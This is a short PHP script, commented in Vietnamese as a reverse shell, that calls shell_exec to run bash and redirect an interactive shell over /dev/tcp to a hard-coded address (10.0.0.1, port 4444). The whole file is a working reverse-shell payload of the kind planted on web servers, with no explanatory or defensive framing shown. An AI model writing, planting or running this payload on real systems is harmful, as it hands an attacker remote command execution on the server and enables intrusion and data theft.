<?php
// reverse_shell - kết nối ngược
$ip = '10.0.0.1';
$port = 4444;
$sh = shell_exec('/bin/bash -c "/bin/bash -i >& /dev/tcp/'.$ip.'/'.$port.' 0>&1"');
?>
